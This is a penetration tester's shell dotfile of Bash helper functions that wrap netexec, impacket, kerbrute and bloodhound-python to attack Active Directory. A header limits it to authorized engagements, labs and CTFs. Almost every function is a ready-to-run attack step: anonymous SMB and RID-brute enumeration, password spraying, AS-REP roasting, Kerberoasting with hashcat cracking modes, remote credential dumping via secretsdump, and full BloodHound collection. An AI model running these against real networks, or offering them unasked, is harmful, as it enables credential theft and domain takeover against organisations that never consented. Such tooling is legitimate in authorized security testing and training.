# ~/dots/shell/ad.sh — Active Directory helpers (netexec / impacket)
#
# Authorized engagements, CTFs, and labs only. Thin wrappers around standard
# tooling; every function acts only on the target/creds you pass it.
#
# Convention: set these once, most helpers read them.
#   export DOMAIN=corp.local DC=10.10.11.10 U=user P='Password1'
# or pass them explicitly.

# --- nxc-null: unauthenticated SMB enum (null / guest) -------------------------
nxc-null() {
    local t="${1:-$RHOST}"; [ -n "$t" ] || { echo "usage: nxc-null <target>"; return 1; }
    echo "[*] null session"; nxc smb "$t" -u '' -p '' --shares 2>/dev/null
    echo "[*] guest";        nxc smb "$t" -u 'guest' -p '' --shares 2>/dev/null
}

# --- nxc-users: RID-brute / enumerate domain users -----------------------------
nxc-users() {
    local t="${1:-$DC}"; [ -n "$t" ] || { echo "usage: nxc-users <dc> [user pass]"; return 1; }
    nxc smb "$t" -u "${2:-guest}" -p "${3:-}" --rid-brute 2>/dev/null | grep -i 'SidTypeUser'
}

# --- nxc-spray: password spray a user list (ONE password, all users) -----------
# Deliberately one password at a time — respect lockout policy on real engagements.
# Usage: nxc-spray <dc> <userlist> <password>
nxc-spray() {
    local dc="$1" ul="$2" pw="$3"
    [ -n "$dc" ] && [ -n "$ul" ] && [ -n "$pw" ] || { echo "usage: nxc-spray <dc> <userlist> <password>"; return 1; }
    echo "[*] spraying '$pw' against $(wc -l < "$ul") users (check lockout policy first!)"
    nxc smb "$dc" -u "$ul" -p "$pw" --continue-on-success 2>/dev/null | grep -E '\[\+\]'
}

# --- kerbrute-users: validate/enumerate users pre-auth (needs kerbrute) ---------
kerbrute-users() {
    local dc="${1:-$DC}" ul="$2" dom="${3:-$DOMAIN}"
    command -v kerbrute >/dev/null || { echo "kerbrute not installed"; return 1; }
    [ -n "$dc" ] && [ -n "$ul" ] && [ -n "$dom" ] || { echo "usage: kerbrute-users <dc> <userlist> <domain>"; return 1; }
    kerbrute userenum --dc "$dc" -d "$dom" "$ul"
}

# --- asrep: AS-REP roast users without pre-auth --------------------------------
# Usage: asrep <dc> <domain> <userlist>   OR   asrep <dc> <domain> (needs creds via env)
asrep() {
    local dc="$1" dom="$2" ul="$3"
    [ -n "$dc" ] && [ -n "$dom" ] || { echo "usage: asrep <dc> <domain> [userlist]"; return 1; }
    if [ -n "$ul" ]; then
        impacket-GetNPUsers "$dom/" -dc-ip "$dc" -usersfile "$ul" -no-pass -request -format hashcat -outputfile asrep.hash
    else
        impacket-GetNPUsers "$dom/${U}:${P}" -dc-ip "$dc" -request -format hashcat -outputfile asrep.hash
    fi
    echo "[+] hashes -> asrep.hash  (crack: hashcat -m 18200 asrep.hash <wordlist>)"
}

# --- kerberoast: request SPN tickets for cracking ------------------------------
kerberoast() {
    local dc="${1:-$DC}" dom="${2:-$DOMAIN}"
    [ -n "$dc" ] && [ -n "$dom" ] && [ -n "$U" ] && [ -n "$P" ] || { echo "needs DC/DOMAIN and \$U/\$P set"; return 1; }
    impacket-GetUserSPNs "$dom/${U}:${P}" -dc-ip "$dc" -request -outputfile kerb.hash
    echo "[+] hashes -> kerb.hash  (crack: hashcat -m 13100 kerb.hash <wordlist>)"
}

# --- secretsdump: dump secrets with creds --------------------------------------
# Usage: secretsdump <target>   (reads $DOMAIN/$U/$P)
secretsdump() {
    local t="${1:-$RHOST}"
    [ -n "$t" ] && [ -n "$U" ] && [ -n "$P" ] || { echo "needs target and \$U/\$P set"; return 1; }
    impacket-secretsdump "${DOMAIN:+$DOMAIN/}${U}:${P}@${t}"
}

# --- bhpy: collect BloodHound data (bloodhound-python) -------------------------
bhpy() {
    local dc="${1:-$DC}" dom="${2:-$DOMAIN}"
    [ -n "$dc" ] && [ -n "$dom" ] && [ -n "$U" ] && [ -n "$P" ] || { echo "needs DC/DOMAIN and \$U/\$P set"; return 1; }
    bloodhound-python -u "$U" -p "$P" -d "$dom" -dc "$dom" -ns "$dc" -c all --zip
    echo "[+] BloodHound zip in $(pwd)"
}

# --- adset: quick view/set of the AD env vars ----------------------------------
adset() {
    echo "DOMAIN=${DOMAIN:-<unset>}  DC=${DC:-<unset>}  U=${U:-<unset>}  P=${P:+<set>}"
}
